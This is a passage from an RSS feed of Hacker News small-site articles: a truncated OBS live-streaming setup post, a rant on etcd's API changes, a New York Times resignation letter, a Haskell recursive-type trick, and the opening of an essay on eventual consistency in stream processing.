<p><img src="https://jordanlewis.org/images/stream/desktop2.png" alt="Desktop"></p>
<p>There‚Äôs a lot to cover with OBS and I‚Äôm not going to try to explain all of it,
so I‚Äôll just talk about what‚Äôs worked for me. To make something that suits you,
you‚Äôll need to flex your creative muscles! You can use the ideas here as a
starting place, but you‚Äôll need to dive into OBS and play around: everyone‚Äôs
setup is going to be different.</p>
<h2 id="scenes">Scenes <a href="#scenes" arialabel="Anchor"><i data-feather="link-2"></i></a> </h2>
<p>A <em>scene</em> is OBS‚Äôs name for a particular layout of video and audio components
on a stream. Typically, you‚Äôll see Twitch streamers stay on a single scene for
most of their stream: their game, desktop, or whatever their focus is. But it‚Äôs
handy to have a few extra ones for the intro and outro to your stream,
something that covers the screen for when you want to take a break, and so on.</p>
<p><img src="https://jordanlewis.org/images/stream/scenes.png" alt="Scenes popped out"></p>
<p>I have the main scenes that I use bound to global hotkeys, so I can switch
between them without having to click around in OBS. Unfortunately, sometimes
the hotkeys stop working during the stream - I‚Äôve yet to figure out exactly why
this happens. If you happen to have this same problem and have found a
workaround, please let me know!</p>
<p>I have 6 primary scenes, and a couple of child scenes that are embedded in
several main scenes to deduplicate on-screen elements (the ones below the
<code>-----</code> in the picture). However, I spend the vast majority of my stream on one
of them: the Desktop scene.</p>
<h3 id="desktop">Desktop <a href="#desktop" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene is the workhorse of the stream, and the one that‚Äôs active 95% of the
time. It consists of a full-screen, 1080p Display Capture source of my external
monitor. This is convenient because it leaves no ambiguity about what‚Äôs catpured
on the stream (it‚Äôs the whole monitor) and leaves my laptop screen free for
the OBS window, monitoring chat, and anything else that I want to look at while
streaming without having to show my viewers.</p>
<p>My <a href="https://jordanlewis.org/posts/desk-setup-2020">Desktop setup post</a> goes into more detail about the
way that I‚Äôve set up my desk to have two monitors. It‚Äôs so convenient for the
stream that I‚Äôm hooked, and I‚Äôm not sure how I‚Äôd manage without.</p>
<p><img src="https://jordanlewis.org/images/stream/desktopscene.png" alt="Desktop Scene in OBS"></p>
<blockquote>
<p>A quick note on font size: you have to make your text editor font quite large
to make it legible for your viewers! It will take a little while to get used
to this. I use 26-point font in my editor, which provides only about 30
visible horizontal lines of code. This is next to nothing compared to the
amount of context you‚Äôre probably used to seeing while programming. This
hamstringing is worth it, though: the bigger your font, the more likely it is
that your viewers will be able to follow along with what you‚Äôre doing, stay
engaged, ask questions, learn, and have fun.</p>
<p>You should also try to remove as many distracting elements from your editor
and desktop as possible while streaming, to keep the focus on the code. For
me, this has meant disabling the Mac‚Äôs menubar and Dock, and removing the
vast majority of toolbars from my IDE.</p>
</blockquote>
<p>Besides the desktop capture source, which is at the back of the scene, I‚Äôve
added several other sources:</p>
<ol>
<li>Face cam, which is a video source from my capture card (more information about the video sources in the <a href="#video">Video</a> section)</li>
<li>Keyboard cam, which is a video source from a webcam pointed at my keyboard.</li>
<li>A couple of text boxes, to show my most recent subscriber, follower, and
some on-stream commands. The text boxes are updated automatically by the
<a href="https://streamlabs.com/dashboard#/streamlabels">StreamLabels</a> app.</li>
<li>A web page source connected to Streamlabs Stream Alerts, which I‚Äôll cover <a href="#stream-alerts">below</a>.</li>
</ol>
<p>I definitely didn‚Äôt start with all of these elements - it‚Äôs quite a lot of work
to tweak things just the way you want - but I‚Äôve kept this configuration for the
past couple of months and I like the way it looks.</p>
<h3 id="whiteboard">Whiteboard <a href="#whiteboard" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>The whiteboard scene is meant to showcase my iPad full screen, allowing me to
draw things on stream to demonstrate ideas or concepts. I use the Concepts app
on the iPad along with an Apple Pencil for drawing, and it works pretty nicely.</p>
<p><img src="https://jordanlewis.org/images/stream/whiteboard.png" alt="Whiteboard scene"></p>
<p>I didn‚Äôt know how to fill up the space on the bottom left, since the iPad
doesn‚Äôt have a widescreen aspect ratio like my monitor does, so I put a picture
that my friend Aileen drew of me to make the stream a bit more visually
interesting!</p>
<p>This scene references the same facecam and alerts source as the Desktop scene.
You can definitely use DRY principles in OBS, just like software - but it does
get tricky to keep everything de-duplicated.</p>
<h3 id="ipad-green-screen-overlay">iPad Green Screen Overlay <a href="#ipad-green-screen-overlay" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I also set up a ‚Äúgreen screen‚Äù configuration for the iPad that I can overlay
over any other scene with a global hotkey. This gives me the ESPN football
announcer effect during my stream: I can draw on my iPad, and the lines will
appear overlayed on top of whatever else I have on stream at the time.</p>
<p>This is probably the most complex video element on my
stream, but OBS makes it pretty simple to set up. I added a Color Key filter
with a black background on top of the raw iPad video feed, set my drawing app
to have a black background, and tweaked the Color Key settings in OBS until
things looked right:</p>
<p><img src="https://jordanlewis.org/images/stream/colorkey.png" alt="iPad Color Key"></p>
<p>I don‚Äôt use this element as nearly as often as I‚Äôd like, but I think it‚Äôs
pretty neat. I recorded a <a href="https://www.youtube.com/watch?v=U4WJQmN1cSo">demo
video</a> of it if you‚Äôre curious for
how it looks - I also use it occasionally on the stream.</p>
<h3 id="selfie">Selfie <a href="#selfie" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This is just a full-screen version of the facecam. I copied the name of the
scene from <a href="https://medium.com/@suzhinton/my-twitch-live-coding-setup-b2516672fb21">@noopkat‚Äôs
blog</a>.</p>
<p><img src="https://jordanlewis.org/images/stream/selfie.png" alt="Selfie scene"></p>
<p>I use this scene for ‚Äúturn to the camera‚Äù moments, which I find really fun. I‚Äôll
switch to the scene, look right at the camera, and talk for a bit before
switching back to the desktop view.</p>
<h3 id="starting-soon">Starting Soon <a href="#starting-soon" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene goes on as soon as the stream turns on, until I‚Äôm ready to start
talking to the camera. I‚Äôll usually start the stream a few minutes before the
time that I announced on Twitter for my stream, and leave it up until that time
comes (with a muted mic!).</p>
<p><img src="https://jordanlewis.org/images/stream/startingsoon.png" alt="Starting Soon scene"></p>
<p>I used a gif I found on the internet of someone typing, so people can tell that
the stream is live even though there‚Äôs nothing happening yet. There‚Äôs also music
during this ‚Äúpre-roll‚Äù. I‚Äôll talk about music and sound <a href="#audio">later</a>).</p>
<h3 id="brb">BRB <a href="#brb" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I‚Äôll put this scene on if I need to step away from the stream for a moment to
use the bathroom or whatever. I added a sound to ‚Ä¶</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordanlewis.org/posts/twitch-live-coding/">https://jordanlewis.org/posts/twitch-live-coding/</a></em></p>]]>
            </description>
            <link>https://jordanlewis.org/posts/twitch-live-coding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23834153</guid>
            <pubDate>Tue, 14 Jul 2020 16:38:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Etcd, or, why modern software makes me sad]]>
            </title>
            <description>
<![CDATA[
Score 1241 | Comments 615 (<a href="https://news.ycombinator.com/item?id=23833362">thread link</a>) | @Spellman
<br/>
July 14, 2020 | https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/ | <a href="https://web.archive.org/web/*/https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <section id="main-content" role="main">
	<article>
		


		<div><p><img alt="etcd icon" src="https://www.roguelazer.com/images/etcd-icon.png"></p>
<p>Once upon a time in 2013, there was a tool called <a href="https://etcd.io/">etcd</a> which was a really lightweight database written
around the <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/raft-atc14">Raft</a> consensus algorithm. This tool was
originally written in 2013 for a <del>bullshit</del> unsuccessful project called <a href="https://coreos.com/os/docs/latest/">CoreOS Container Linux</a> that was
EOL'd several years ago, but that doesn't really matter ‚Äî etcd was greater than its original use-case. Etcd
provided a convenient and simple set of primitives (set a key, get a key, set-only-if-unchanged, watch-for-changes) with
a drop-dead simple HTTP API on top of them. I have built a number of tools using etcd as a lightweight consensus store
behind them and it's absolutely a pleasure to work with.</p>
<div>
<p>Hello <strong>massive influx of new readers</strong>! I see that some <del>person who's out to get me</del> kind soul has
cross-posted this to Hacker News, Reddit, and a bunch of other sites. Cool! A few things you might want to know <em>before</em>
you send me hate-mail:</p>
<ul>
<li>The word "rant" is right up there in the tags line. This is not meant to be a persuasive argument to the secret cabal
  that controls API design or a nuanced technical comparison article. It's just some off-the-cuff thoughts. Chillax.</li>
<li>If this didn't come across clearly enough in the article: <em>I think etcd is great!</em> I have written a bunch of tools and
  applications on top of it! I think it's a fantastic little d√¶mon and its API, even the new janky v3 API, is still a
  million times better than ZooKeeper</li>
</ul>
<p>Okay, then. Read on.</p>
</div>
<p>In 2015, an unrelated tool called <a href="https://github.com/kubernetes/kubernetes">Kubernetes</a> was released by Google (but, really, by
Xooglers). I would go so far as to say that Kubernetes (or, as the "cool kids" say, <kbd>k8s</kbd>) is the worst thing to happen to system administration
since <a href="https://www.roguelazer.com/2020/03/systemd/">systemd</a>. It's a comprehensive suite that promises to simplify operating clusters of software and give something like 
the experience of Google's <kbd>borg</kbd> cluster manager. What it really does is:</p>
<ol>
<li>Add hundreds of new failure modes to your software</li>
<li>Move you from writing portable software configuration to writing thousands of lines of k8s-specific YAML</li>
<li>Ensnare you in a mesh of questionably-good<sup id="fnref:questionably-good"><a href="#fn:questionably-good">1</a></sup> patterns like containerization and software defined networking</li>
</ol>
<p>If you are running a truly enormous system and want to have off-the-shelf orchestration for it, Kubernetes may be
the tool for you. For 99.9% of people out there, it's just an extra layer of complexity that adds almost nothing of
value.</p>
<p>I digress, though; this is a story about etcd. And, unfortunately, our stories come together because Kubernetes was
quickly changed to use etcd as its state store. Thus began the rapid decline of etcd.</p>
<p>With the massive influx of Kubernetes users came, of course, a large number of Xooglers who decided to infect etcd with
Google technologies, as is their way<sup id="fnref:infection"><a href="#fn:infection">2</a></sup><sup id="fnref:who"><a href="#fn:who">3</a></sup>. Etcd's simple HTTP API was replaced by a "gRPC"<sup id="fnref:grpc"><a href="#fn:grpc">4</a></sup> version; the
simple internal data model was replaced by a dense and non-orthogonal data model with different types for leases, locks,
transactions, and plain-old-keys. etcd 3.2 added back a tiny subset of the HTTP API through the <a href="https://etcd.io/docs/v3.4.0/dev-guide/api_grpc_gateway/">"gRPC
Gateway"</a>, but not enough to implement
any of the rich applications built on top of the original API. The v2 API lives on for now, but upstream threatens to
remove it in every new version and there will surely come a time when it'll be removed entirely.</p>
<p>That's it. That's the story. Popular modern technology is taken over by expats from a megacorp and made worse in the
service of a hyper-specialized (and just plain over-hyped) orchestration platform. That's the world today. Anything that
has a simple and elegant feature-set ends up co√∂pted by people who just want to build big ungainly architecture and ends
up inheriting features from whatever megacorp the co√∂pters came from<sup id="fnref:megacorp"><a href="#fn:megacorp">9</a></sup>. The software development world would
prefer to use their multi-gigabyte IDEs running on ElectronJS to build thousand-dependency Java applications targeting
ungainly APIs on hard-to-operate systems than support something simpler and better. Quality is, alas, a dying art.</p>
</div>
<hr>
<h2>Comments</h2>


	</article>
    </section>
</div></div>]]>
            </description>
            <link>https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833362</guid>
            <pubDate>Tue, 14 Jul 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resignation Letter]]>
            </title>
            <description>
<![CDATA[
Score 635 | Comments 638 (<a href="https://news.ycombinator.com/item?id=23833267">thread link</a>) | @kirillzubovsky
<br/>
July 14, 2020 | https://www.bariweiss.com/resignation-letter | <a href="https://web.archive.org/web/*/https://www.bariweiss.com/resignation-letter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-5f0dca0caa6bc4150907a76b"><div><p>Dear A.G.,</p><p>It is with sadness that I write to tell you that I am resigning from The New York Times.&nbsp;</p><p>I joined the paper with gratitude and optimism three years ago. I was hired with the goal of bringing in voices that would not otherwise appear in your pages: first-time writers, centrists, conservatives and others who would not naturally think of The Times as their home. The reason for this effort was clear: The paper‚Äôs failure to anticipate the outcome of the 2016 election meant that it didn‚Äôt have a firm grasp of the country it covers. Dean Baquet and others have admitted as much on various occasions. The priority in Opinion was to help redress that critical shortcoming.</p><p>I was honored to be part of that effort, led by James Bennet. I am proud of my work as a writer and as an editor. Among those I helped bring to our pages: the Venezuelan dissident Wuilly Arteaga; the Iranian chess champion Dorsa Derakhshani; and the Hong Kong Christian democrat Derek Lam. Also: Ayaan Hirsi Ali, Masih Alinejad, Zaina Arafat, Elna Baker, Rachael Denhollander, Matti Friedman, Nick Gillespie, Heather Heying, Randall Kennedy, Julius Krein, Monica Lewinsky, Glenn Loury, Jesse Singal, Ali Soufan, Chloe Valdary, Thomas Chatterton Williams, Wesley Yang, and many others.</p><p>But the lessons that ought to have followed the election‚Äîlessons about the importance of understanding other Americans, the necessity of resisting tribalism, and the centrality of the free exchange of ideas to a democratic society‚Äîhave not been learned. Instead, a new consensus has emerged in the press, but perhaps especially at this paper: that truth isn‚Äôt a process of collective discovery, but an orthodoxy already known to an enlightened few whose job is to inform everyone else.</p><p>Twitter is not on the masthead of The New York Times. But Twitter has become its ultimate editor. As the ethics and mores of that platform have become those of the paper, the paper itself has increasingly become a kind of performance space. Stories are chosen and told in a way to satisfy the narrowest of audiences, rather than to allow a curious public to read about the world and then draw their own conclusions.<strong> </strong>I was always taught that journalists were charged with writing the first rough draft of history. Now, history itself is one more ephemeral thing molded to fit the needs of a predetermined narrative.</p><p>My own forays into Wrongthink have made me the subject of constant bullying by colleagues who disagree with my views. They have called me a Nazi and a racist; I have learned to brush off comments about how I‚Äôm ‚Äúwriting about the Jews again.‚Äù Several colleagues perceived to be friendly with me were badgered by coworkers. My work and my character are openly demeaned on company-wide Slack channels where masthead editors regularly weigh in. There, some coworkers insist I need to be rooted out if this company is to be a truly ‚Äúinclusive‚Äù one, while others post ax emojis next to my name. Still other New York Times employees publicly smear me as a liar and a bigot on Twitter with no fear that harassing me will be met with appropriate action. They never are.</p><p>There are terms for all of this: unlawful discrimination, hostile work environment, and constructive discharge. I‚Äôm no legal expert. But I know that this is wrong.&nbsp;</p><p>I do not understand how you have allowed this kind of behavior to go on inside your company in full view of the paper‚Äôs entire staff and the public. And I certainly can‚Äôt square how you and other Times leaders have stood by while simultaneously praising me in private for my courage. Showing up for work as a centrist at an American newspaper should not require bravery.</p><p>Part of me wishes I could say that my experience was unique. But the truth is that intellectual curiosity‚Äîlet alone risk-taking‚Äîis now a liability at The Times. Why edit something challenging to our readers, or write something bold only to go through the numbing process of making it ideologically kosher, when we can assure ourselves of job security (and clicks) by publishing our 4000th op-ed arguing that Donald Trump is a unique danger to the country and the world? And so self-censorship has become the norm.</p><p>What rules that remain at The Times are applied with extreme selectivity. If a person‚Äôs ideology is in keeping with the new orthodoxy, they and their work remain unscrutinized. Everyone else lives in fear of the digital thunderdome. Online venom is excused so long as it is directed at the proper targets.&nbsp;</p><p>Op-eds that would have easily been published just two years ago would now get an editor or a writer in serious trouble, if not fired. If a piece is perceived as likely to inspire backlash internally or on social media, the editor or writer avoids pitching it. If she feels strongly enough to suggest it, she is quickly steered to safer ground. And if, every now and then, she succeeds in getting a piece published that does not explicitly promote progressive causes, it happens only after every line is carefully massaged, negotiated and caveated.</p><p>It took the paper two days and two jobs to say that the Tom Cotton op-ed ‚Äúfell short of our standards.‚Äù We attached an editor‚Äôs note on a travel story about Jaffa shortly after it was published because it ‚Äúfailed to touch on important aspects of Jaffa‚Äôs makeup and its history.‚Äù But there is still none appended to Cheryl Strayed‚Äôs fawning interview with the writer Alice Walker, a proud anti-Semite who believes in lizard Illuminati.&nbsp;</p><p>The paper of record is, more and more, the record of those living in a distant galaxy, one whose concerns are profoundly removed from the lives of most people. This is a galaxy in which, to choose just a few recent examples, the Soviet space program is lauded for its ‚Äúdiversity‚Äù; the doxxing of teenagers in the name of justice is condoned; and the worst caste systems in human history includes the United States alongside Nazi Germany.</p><p>Even now, I am confident that most people at The Times do not hold these views. Yet they are cowed by those who do. Why? Perhaps because they believe the ultimate goal is righteous. Perhaps because they believe that they will be granted protection if they nod along as the coin of our realm‚Äîlanguage‚Äîis degraded in service to an ever-shifting laundry list of right causes. Perhaps because there are millions of unemployed people in this country and they feel lucky to have a job in a contracting industry.&nbsp;</p><p>Or perhaps it is because they know that, nowadays, standing up for principle at the paper does not win plaudits. It puts a target on your back. Too wise to post on Slack, they write to me privately about the ‚Äúnew McCarthyism‚Äù that has taken root at the paper of record.</p><p>All this bodes ill, especially for independent-minded young writers and editors paying close attention to what they‚Äôll have to do to advance in their careers. Rule One: Speak your mind at your own peril. Rule Two: Never risk commissioning a story that goes against the narrative. Rule Three: Never believe an editor or publisher who urges you to go against the grain. Eventually, the publisher will cave to the mob, the editor will get fired or reassigned, and you‚Äôll be hung out to dry.</p><p>For these young writers and editors, there is one consolation. As places like The Times and other once-great journalistic institutions betray their standards and lose sight of their principles, Americans still hunger for news that is accurate, opinions that are vital, and debate that is sincere. I hear from these people every day. ‚ÄúAn independent press is not a liberal ideal or a progressive ideal or a democratic ideal. It‚Äôs an American ideal,‚Äù you said a few years ago. I couldn‚Äôt agree more. America is a great country that deserves a great newspaper.&nbsp;</p><p>None of this means that some of the most talented journalists in the world don‚Äôt still labor for this newspaper. They do, which is what makes the illiberal environment especially heartbreaking. I will be, as ever, a dedicated reader of their work. But I can no longer do the work that you brought me here to do‚Äîthe work that Adolph Ochs described in that famous 1896 statement: ‚Äúto make of the columns of The New York Times a forum for the consideration of all questions of public importance, and to that end to invite intelligent discussion from all shades of opinion.‚Äù</p><p>Ochs‚Äôs idea is one of the best I‚Äôve encountered. And I‚Äôve always comforted myself with the notion that the best ideas win out. But ideas cannot win on their own. They need a voice. They need a hearing. Above all, they must be backed by people willing to live by them.&nbsp;</p><p>Sincerely,</p><p>Bari </p></div></div></div></div>]]>
            </description>
            <link>https://www.bariweiss.com/resignation-letter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833267</guid>
            <pubDate>Tue, 14 Jul 2020 15:43:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forbidden Haskell Types]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23832220">thread link</a>) | @lelf
<br/>
July 14, 2020 | https://semantic.org/post/forbidden-haskell-types/ | <a href="https://web.archive.org/web/*/https://semantic.org/post/forbidden-haskell-types/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Sometimes, writing Haskell is like having an argument with the compiler. You give it your reasoning, and it checks it over for flaws. And if it thinks it finds one, it will tell you all about it. You then have to look over what it told you, and figure out exactly what its complaint is. <em>Did I just express myself badly? Or am I actually wrong?</em> Or, very occasionally, the compiler is just being petulant and you have to work around it. Of course, if you‚Äôre <em>really</em> upset about GHC not accepting your perfectly reasonably argued program, you can <a href="https://gitlab.haskell.org/ghc/ghc/-/issues">go tell its parents</a>.</p>



<p>Haskell‚Äôs type system is pretty great, but one thing it doesn‚Äôt have, that some other type systems do have, is <em>recursive</em> types, by which I mean, types directly constructed from themselves. Recursive types are forbidden in Haskell.</p>



<p>Let‚Äôs say we want to create a recursive type <code>T = Maybe T</code>. The official introductory Haskell answer to this is that one cannot do this directly, but one can easily create a type <code>T</code> that <em>contains</em> <code>Maybe T</code>, sometimes called a ‚Äúnewtype wrapper‚Äù. Like this:</p>



<pre><code>newtype T = MkT (Maybe T)</code></pre>



<p>Simple enough. But can we do better than this? Can we create a type <code>T</code> that is actually equal to <code>Maybe T</code>? <em>Can we create the forbidden recursive type?</em></p>



<p>Let‚Äôs start with <em>won‚Äôt</em> work:</p>



<pre><code>type T = Maybe T</code></pre>



<pre>Example.hs:6:1: error:
    Cycle in type synonym declarations:
      Example.hs:6:1-16: type T = Maybe T</pre>



<p>The <code>type</code> keyword creates an <em>alias</em> for a type, and aliases cannot be recursive as they must eventually refer to an actual type.</p>



<p>Oddly enough, GHC <em>does</em> accept this:</p>



<pre><code>type family T where
    T = Maybe T</code></pre>



<p>Type families are strange things. They‚Äôre not quite ‚Äúreal‚Äù types, but neither are they mere aliases for types, as they don‚Äôt have to be fully resolved. Indeed you can declare a type family in one module, use it all over as if it were a real type, and then define the actual instances of that family in another module.</p>



<p>Sadly, though, GHC won‚Äôt let us actually use the instance. It rejects the obvious proof that <code>T</code> and <code>Maybe T</code> are the same type:</p>



<pre><code>type family T where
    T = Maybe T

proof :: T :~: Maybe T
proof = Refl</code></pre>



<pre>Example.hs:10:9: error:
    ‚Ä¢ Reduction stack overflow; size = 201
      When simplifying the following type: T</pre>



<p>Why is this? It‚Äôs because GHC can‚Äôt just accept what it‚Äôs been told, and instead endlessly tries to ‚Äúreduce‚Äù (that is, expand) <code>T = Maybe&nbsp;T = Maybe&nbsp;(Maybe&nbsp;T)</code> etc, giving up when it reaches a safety limit. You can think of it as a kind of intellectual black hole, or an ‚Äúinfohazard‚Äù for the compiler: if it ever starts examining the strange secrets of your recursive type, it will get lost in the infinite abyss, until a built-in emergency mechanism kicks it awake after it‚Äôs twisted in the vortex 200 times (you can change this number if you want, or even let it run forever).</p>



<p>It turns out we <em>can</em> construct a type <code>T</code> together with a proper (non-bottom) proof value of <code>T :~: Maybe T</code>, we just have to be discreet. The key is to make sure GHC never comes across the unfathomable constraint <code>T ~ Maybe T</code>, because it will immediately become ensnared in the contemplation of its endlessness.</p>



<p>Instead, we prepare a lemma that is both harmless and more general, and then carefully specialise it to get the terrifying conclusion we want, using the <code>TypeApplications</code> extension, thus avoiding the need for any kind of inference:</p>



<pre><code>type family A p q where
    A () x = Maybe (A x ())

lemma :: forall x. (A () x) :~: Maybe (A x ())
lemma  = Refl

type T = A () ()

proof :: T :~: Maybe T
proof = lemma @()</code></pre>



<p>Actually constructing and deconstructing values of <code>T</code> will require a similar circumspection. The trick is, we don‚Äôt let GHC infer types. We musn‚Äôt let GHC <em>think</em>, because thinking about the bad thing leads it to madness. Instead, we apply all types by hand. Here‚Äôs the full program, including all the necessary extensions:</p>



<pre><code>{-# LANGUAGE RankNTypes, TypeApplications, TypeOperators,
    TypeFamilies, UndecidableInstances, AllowAmbiguousTypes #-}
module Main where
import Data.Type.Equality

type family A p q where
    A () x = Maybe (A x ())

lemma :: forall x. (A () x) :~: Maybe (A x ())
lemma  = Refl

type T = A () ()

proof :: T :~: Maybe T
proof = lemma @()

convert1 :: forall a b. a :~: b -&gt; a -&gt; b
convert1 Refl = id

convert2 :: forall a b. a :~: b -&gt; b -&gt; a
convert2 Refl = id

tconvert1 :: T -&gt; Maybe T
tconvert1 = convert1 @T @(Maybe T) proof

tconvert2 :: Maybe T -&gt; T
tconvert2 = convert2 @T @(Maybe T) proof

nothing :: T
nothing = tconvert2 $ Nothing @T

just :: T -&gt; T
just x = tconvert2 $ Just @T x

count :: T -&gt; Int
count t = case tconvert1 t of
    Nothing -&gt; 0
    Just t' -&gt; succ $ count t'

t3 :: T
t3 = just $ just $ just nothing

main :: IO ()
main = putStrLn $ show $ count t3
</code></pre>



<p>This program defines a truly recursive type <code>T = Maybe T</code>, constructs a value of it, and then deconstructs that value. (It does indeed correctly print ‚Äú3‚Äù.) On the other hand, it‚Äôs <em>much</em> more complicated than just using a newtype like we‚Äôre supposed to‚Ä¶</p>



<p>‚Äî Ashley Yakeley</p>
					</div></div>]]>
            </description>
            <link>https://semantic.org/post/forbidden-haskell-types/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23832220</guid>
            <pubDate>Tue, 14 Jul 2020 14:16:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eventual Consistency isn‚Äôt for Streaming]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 47 (<a href="https://news.ycombinator.com/item?id=23832149">thread link</a>) | @arjunnarayan
<br/>
July 14, 2020 | https://materialize.io/eventual-consistency-isnt-for-streaming/ | <a href="https://web.archive.org/web/*/https://materialize.io/eventual-consistency-isnt-for-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Streaming systems consume inputs and produce outputs asyncronously: the output of a system at any moment may not reflect all of the inputs seen so far. These systems provide various guarantees about how their outputs relate to their input. Among the weaker (but not unpopular) guarantees is <a href="https://en.wikipedia.org/wiki/Eventual_consistency">eventual consistency</a>. Informally, eventual consistency means if the input stops changing, the output will eventually arrive at the correct result.</p>
<p>In this post we‚Äôll see that for as long as its input streams haven‚Äôt been stopped, natural eventually consistent computations can produce <em>unboundedly large and systematic errors</em>. If you are doing even slightly non-trivial computations, you should be prepared for your results to be <em>never-consistent</em> (a much less popular consistency definition). Until you pause the input streams and await correct answers, at least.</p>
<p>Not all is lost! There are stream processing systems that provide strong consistency guarantees. <a href="https://materialize.io/">Materialize</a> and <a href="https://github.com/TimelyDataflow/differential-dataflow">Differential Dataflow</a> both avoid these classes of errors by providing <em>always correct</em> answers, as do several other streaming systems.</p>
<p>If you want to avoid systematic and on-going errors in your results, you should probably check if the stream processor you use provides stronger consistency guarantees.</p>
<h2>Background on Eventual Consistency</h2>
<p>To quote from the <a href="https://en.wikipedia.org/wiki/Eventual_consistency">Wikipedia page on eventual consistency</a></p>
<blockquote><p>
  Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value.
</p></blockquote>
<p>Eventual consistency is most often invoked for key-value stores, where each key tracks an independent value and one can reasonably imagine not updating the value associated with a key for long enough that the right answer might shake out. For example, if a database stores a map from people to their addresses, your update to your own address might not be visible immediately, but if you give it a few minutes it will probably sort itself out (if you don‚Äôt further update your address).</p>
<p>The requirement is only that folks stop updating a specific key, not that they stop using the database entirely. The rest of the world can keep reading out addresses, even keep reading out your stale address, and an eventually consistent system is obliged to eventually update your address (assuming you don‚Äôt keep re-submitting updates). Eventual consistency is a workable definition of consistency for key-value stores, where the vast majority of operations do not conflict, and one can reasonably expect to wait out any inconsistency.</p>
<p>Is eventual consistency a workable definition of consistency for streaming computations?</p>
<h2>Streaming computations</h2>
<p>There are many streaming computations out there. I‚Äôm going to focus on a class that lines up well with our study of consistency: incremental view maintenance. Incremental view maintenance is where you‚Äôve defined a view, essentially a name bound to a query, and want to see the output answers change as the input data change.</p>
<p>Let‚Äôs say you‚Äôve defined a query that could be applied to a static dataset, something like</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>Now, the underlying <code>data</code> might change. As they do, we should produce the corresponding changes to the output. In this case, we would like to see how the <code>count</code> of the records in <code>data</code> have changed.</p>
<p>There are more complicated queries we might write. For example, this query determines the set of keys whose values are the largest among all keys:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>As <code>data</code> change, we would like to see the resulting set of keys track the maximum values</p>
<p>This next query determines the standard deviation of values for each key, and then selects out those values that are surprisingly large.</p>
<pre title="">-- determine average and stddev for groups
create view stats_by_key
select
    data.key,
    avg(data.value) as average,
    stddev(data.value) as deviation
from data
group by data.key;

-- select out surprisingly large values
select data.key, data.value
from data, stats_by_key
where
    data.key = stats_by_key.key and
    data.value &gt; average + 3 * devation
</pre>
<p>As <code>data</code> move around, the set of current outliers moves around too, and we would be delighted to be warned of them so that we can take some important action.</p>
<p>I don‚Äôt have strong opinions about whether these are exciting queries to compute, but we‚Äôll use them as examples of streaming computations that can go surprisingly wrong. If your computations are more sophisticated than these examples, you might have even more to worry about.</p>
<h2>Eventual consistency in streaming: example 1</h2>
<p>What does a naive application of eventual consistency have to say about</p>
<pre title="">-- count the records in `data`
select count(*) from data
</pre>
<p>It‚Äôs not really clear, is it? Even if there were clear keys we are writing to, the thing we want to be correct is an aggregation across all of them rather than the value associated with a specific key. That result depends on all values. We could still extrapolate the definition of eventual consistency out to mean that if the input stops changing entirely, the system will eventually update to the correct count of records in <code>data</code>.</p>
<p>Although you shouldn‚Äôt expect to see this in the wild, an eventually consistent streaming system is certainly permitted to delay its processing as long as there are any outstanding input records that haven‚Äôt been processed yet.</p>
<p>This is actually not as unreasonable as you might think. Many stream processors intentionally batch up their inputs to improve their efficiency, and get started only once they get a moment of fresh air in their input stream. This technique allows them to improve their throughput during load spikes, by batching and re-ordering updates (for example, bundling all updates to the same key). It would be natural to see updates out of order, but taken to the extreme this technique results is no updates during the load spike.</p>
<p>While this is not necessarily something you‚Äôll see in a professional stream processor, nothing about eventual consistency prevents behavior like this. So, while it‚Äôs not the most realistic reason to be worried about eventual consistency, it paints a bit of a picture about what we might need to watch out for.</p>
<p>Let‚Äôs ignore the possibility that a technically correct eventually consistent processor could produce no results, and instead look at what happens for more reasonable systems on continually changing input streams.</p>
<h2>Eventual consistency in streaming: example 2</h2>
<p>Let‚Äôs take the query that selects out the keys with maximum values:</p>
<pre title="">-- select keys with maximum values
select data.key
from data
where data.value in (select max(data.value) from data)
</pre>
<p>This is how you express ‚Äúargmax‚Äù in SQL, and it is roughly equivalent to a join between the collections <code>data</code> and <code>select max(data.value) from data</code>.</p>
<p>A reasonable person might expect to see the keys with maximum values here, and have an eventually consistent system eventually show it some maximal keys. Some head scratching and you might walk that back to ‚Äúany keys at all‚Äù because they might no longer be maximal at the moment you see them. But <em>eventually</em> we should see <em>some</em> keys, right?</p>
<p>Nope.</p>
<p>At least, not as long as the input stream is allowed to change.</p>
